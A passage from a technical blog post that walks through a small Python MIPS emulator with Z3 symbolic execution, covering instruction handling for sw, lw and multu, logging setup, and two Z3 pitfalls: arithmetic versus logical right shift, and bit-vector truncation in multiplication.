</span><span class='line'>    <span class="n">x</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;loc_&#39;</span><span class="p">,</span> <span class="s">&#39;0x&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="bp">None</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">_is_memderef</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Is it a memory dereference?&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="k">return</span> <span class="s">&#39;(&#39;</span> <span class="ow">in</span> <span class="n">x</span> <span class="ow">and</span> <span class="s">&#39;)&#39;</span> <span class="ow">in</span> <span class="n">x</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">is_stackvar</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Is is a stack variable?&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="s">&#39;(fp)&#39;</span> <span class="ow">in</span> <span class="n">x</span> <span class="ow">and</span> <span class="s">&#39;+&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="s">&#39;var_&#39;</span> <span class="ow">in</span> <span class="n">x</span> <span class="ow">and</span> <span class="s">&#39;+&#39;</span> <span class="ow">in</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">to_stackvar</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Get the stack variable name&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="n">_</span><span class="p">,</span> <span class="n">var_name</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;+&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">var_name</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;(fp)&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, we have to handle every different instructions and their encodings. Of course, you need to implement only the instructions you want: most likely the ones that are used in the code you are interested int. In a nutshell, this is the core of the engine. You can also use it to output valid Python/C lines if you fancy having a decompiler in your sleeve ; might be handy right?</p>

<p>This is what the core function looks like, it is really simple, dumb and so unoptimized ; but at least it&rsquo;s clear to me:</p>

<figure class='code'><figcaption><span>mini_mips_symexec_engine.py@step</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">step</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;This is the core of the engine -- you are supposed to implement the semantics</span>
</span><span class='line'><span class="sd">  of all the instructions you want to emulate here.&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">code</span><span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">pc</span><span class="p">]</span>
</span><span class='line'>  <span class="n">addr</span><span class="p">,</span> <span class="n">instr</span><span class="p">,</span> <span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_parse_line</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">instr</span> <span class="o">==</span> <span class="s">&#39;sw&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_gpr</span><span class="p">(</span><span class="n">a0</span><span class="p">)</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_stackvar</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">a2</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>      <span class="n">var_name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">to_stackvar</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%s</span><span class="s"> = $</span><span class="si">%s</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">var_name</span><span class="p">,</span> <span class="n">a0</span><span class="p">)</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="n">var_name</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">a0</span><span class="p">]</span>
</span><span class='line'>    <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_gpr</span><span class="p">(</span><span class="n">a0</span><span class="p">)</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_memderef</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">a2</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>      <span class="n">idx</span><span class="p">,</span> <span class="n">base</span> <span class="o">=</span> <span class="n">a1</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;(&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">base</span> <span class="o">=</span> <span class="n">base</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;$&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;)&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">computed_address</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">base</span><span class="p">]</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">_to_imm</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;[</span><span class="si">%s</span><span class="s"> + </span><span class="si">%s</span><span class="s">] = $</span><span class="si">%s</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">a0</span><span class="p">)</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">computed_address</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">a0</span><span class="p">]</span>
</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;sw not implemented&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">elif</span> <span class="n">instr</span> <span class="o">==</span> <span class="s">&#39;lw&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_gpr</span><span class="p">(</span><span class="n">a0</span><span class="p">)</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">is_stackvar</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">a2</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>      <span class="n">var_name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">to_stackvar</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">var_name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="p">:</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39; WARNING: Assuming </span><span class="si">%s</span><span class="s"> was 0&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">var_name</span><span class="p">,</span> <span class="p">))</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="n">var_name</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;$</span><span class="si">%s</span><span class="s"> = </span><span class="si">%s</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">a0</span><span class="p">,</span> <span class="n">var_name</span><span class="p">)</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">a0</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="n">var_name</span><span class="p">]</span>
</span><span class='line'>    <span class="k">elif</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_gpr</span><span class="p">(</span><span class="n">a0</span><span class="p">)</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_memderef</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">a2</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>      <span class="n">idx</span><span class="p">,</span> <span class="n">base</span> <span class="o">=</span> <span class="n">a1</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;(&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">base</span> <span class="o">=</span> <span class="n">base</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;$&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;)&#39;</span><span class="p">,</span> <span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">computed_address</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">base</span><span class="p">]</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">_to_imm</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">computed_address</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">:</span>
</span><span class='line'>        <span class="n">value</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39; WARNING </span><span class="si">%.8x</span><span class="s"> is not in your memory store -- what value is there @0x</span><span class="si">%.8x</span><span class="s">?&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">computed_address</span><span class="p">,</span> <span class="n">computed_address</span><span class="p">))</span>
</span><span class='line'>      <span class="k">else</span><span class="p">:</span>
</span><span class='line'>        <span class="n">value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">computed_address</span><span class="p">]</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;$</span><span class="si">%s</span><span class="s"> = [</span><span class="si">%s</span><span class="s">+</span><span class="si">%s</span><span class="s">]&#39;</span><span class="p">,</span> <span class="n">a0</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">base</span><span class="p">)</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">a0</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s">&#39;lw not implemented&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">[</span><span class="o">...</span><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first level of <em>if</em> handles the different instructions, the second level of <em>if</em> handles the different encodings an instruction can have. The <em>self.logger</em> thingy is just my way to save the execution traces in files to let the console clean:</p>

<figure class='code'><figcaption><span>mini_mips_symexec_engine.py@__init__</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">trace_name</span><span class="p">):</span>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>    <span class="s">&#39;zero&#39;</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>    <span class="s">&#39;at&#39;</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>    <span class="s">&#39;v0&#39;</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>    <span class="s">&#39;v1&#39;</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'><span class="c"># [...]</span>
</span><span class='line'>    <span class="s">&#39;lo&#39;</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span><span class='line'>    <span class="s">&#39;hi&#39;</span> <span class="p">:</span> <span class="mi">0</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">stack</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">pc</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">code</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">mem</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">stack_offsets</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">enable_z3</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s">&#39;traces&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>      <span class="n">os</span><span class="o">.</span><span class="n">mkdir</span><span class="p">(</span><span class="s">&#39;traces&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="n">trace_name</span><span class="p">)</span>
</span><span class='line'>  <span class="n">h</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">FileHandler</span><span class="p">(</span>
</span><span class='line'>      <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">&#39;traces&#39;</span><span class="p">,</span> <span class="n">trace_name</span><span class="p">),</span>
</span><span class='line'>      <span class="n">mode</span> <span class="o">=</span> <span class="s">&#39;w&#39;</span>
</span><span class='line'>  <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">h</span><span class="o">.</span><span class="n">setFormatter</span><span class="p">(</span>
</span><span class='line'>      <span class="n">logging</span><span class="o">.</span><span class="n">Formatter</span><span class="p">(</span>
</span><span class='line'>          <span class="s">&#39;</span><span class="si">%(levelname)s</span><span class="s">: </span><span class="si">%(asctime)s</span><span class="s"> </span><span class="si">%(funcName)s</span><span class="s"> @ l</span><span class="si">%(lineno)d</span><span class="s"> -- </span><span class="si">%(message)s</span><span class="s">&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="n">datefmt</span> <span class="o">=</span> <span class="s">&#39;%Y-%m-</span><span class="si">%d</span><span class="s"> %H:%M:%S&#39;</span>
</span><span class='line'>      <span class="p">)</span>
</span><span class='line'>  <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
</span><span class='line'>  <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">addHandler</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>At that point, if I wanted only an emulator I would be done. But because I want to use <a href="https://z3.codeplex.com/">Z3</a> and symbolic variables I want to get your attention on two common pitfalls that can cost you hours of debugging (trust me on that one :&ndash;():</p>

<ul>
<li>The first one is that the operator <em>__rshift__</em> isn&rsquo;t the logical right shift but the arithmetical one; which is quite different and can generate results you don&rsquo;t expect:</li>
</ul>


<figure class='code'><figcaption><span>LShR VS >></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">In</span> <span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">In</span> <span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="n">simplify</span><span class="p">(</span><span class="n">BitVecVal</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">Out</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">6</span>
</span><span class='line'>
</span><span class='line'><span class="n">In</span> <span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="n">simplify</span><span class="p">(</span><span class="n">LShR</span><span class="p">(</span><span class="n">BitVecVal</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="mi">1</span><span class="p">))</span>
</span><span class='line'><span class="n">Out</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">2</span>
</span><span class='line'>
</span><span class='line'><span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">4</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span>
</span><span class='line'><span class="n">Out</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">2</span>
</span></code></pre></td></tr></table></div></figure>


<p>  To workaround that I usually define my own <em>_LShR</em> function that does whatever is correct according to the operand types (yes we could also replace <em>z3.BitVecNumRef.__rshift__</em> by <em>LShR</em> directly):</p>

<figure class='code'><figcaption><span>mini_mips_symexec_engine@_LShR</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">_LShR</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Useful hook function if you want to run the emulation</span>
</span><span class='line'><span class="sd">  with/without Z3 as LShR is different from &gt;&gt; in Z3&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">enable_z3</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="nb">long</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="nb">int</span><span class="p">):</span>
</span><span class='line'>      <span class="n">a</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="nb">long</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="nb">int</span><span class="p">):</span>
</span><span class='line'>      <span class="n">b</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">LShR</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">a</span> <span class="o">&gt;&gt;</span> <span class="n">b</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>The other interesting detail to keep in mind is that you can&rsquo;t have any overflow on <em>BitVec</em>s of the same size ; the result is automatically truncated. So if you happen to have mathematical operations that need to overflow, like a multiplication (this is used in the challenge), you should store the temporary result in a bigger temporary variable. In my case, I was supposed to store the overflow inside another register, <em>$hi</em> which is used to store the high <em>DWORD</em> part of the result. But because I wasn&rsquo;t storing the result in a bigger <em>BitVec</em>, <em>$hi</em> ended up <strong>always</strong> equal to zero which is quite a nice problem when you have to pinpoint this issue in thousands lines of assembly :&ndash;).</li>
</ul>


<figure class='code'><figcaption><span>mini_mips_symexec_engine@step@multu</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">elif</span> <span class="n">instr</span> <span class="o">==</span> <span class="s">&#39;multu&#39;</span><span class="p">:</span>
</span><span class='line'>  <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_gpr</span><span class="p">(</span><span class="n">a0</span><span class="p">)</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">_is_gpr</span><span class="p">(</span><span class="n">a1</span><span class="p">)</span> <span class="ow">and</span> <span class="n">a2</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;$lo = ($</span><span class="si">%s</span><span class="s"> * $</span><span class="si">%s</span><span class="s">) &amp; 0xffffffff&#39;</span><span class="p">,</span> <span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">)</span>
</span><span class='line'>    <span class="bp">self</span><span class="o">.</span><span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#39;$hi = ($</span><span class="si">%s</span><span class="s"> * $</span><span class="si">%s</span><span class="s">) &gt;&gt; 32&#39;</span><span class="p">,</span> <span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">enable_z3</span><span class="p">:</span>
</span><span class='line'>      <span class="n">a0bis</span><span class="p">,</span> <span class="n">a1bis</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">a0</span><span class="p">],</span> <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="n">a1</span><span class="p">]</span>
</span><span class='line'>      <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">a0bis</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">a0bis</span><span class="p">,</span> <span class="nb">long</span><span class="p">):</span>
</span><span class='line'>        <span class="n">a0bis</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="n">a0bis</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">a1bis</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">a1bis</span><span class="p">,</span> <span class="nb">long</span><span class="p">):</span>
</span><span class='line'>        <span class="n">a1bis</span> <span class="o">=</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="n">a1bis</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">a064</span> <span class="o">=</span> <span class="n">ZeroExt</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">a0bis</span><span class="p">)</span>
</span><span class='line'>      <span class="n">a164</span> <span class="o">=</span> <span class="n">ZeroExt</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="n">a1bis</span><span class="p">)</span>
</span><span class='line'>      <span class="n">r</span> <span class="o">=</span> <span class="n">a064</span> <span class="o">*</span> <span class="n">a164</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;lo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">Extract</span><span class="p">(</span><span class="mi">31</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
</span><span class='line'>      <span class="bp">self</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;hi&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">Extract</span><span class="p">(</span><span class="mi">63</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
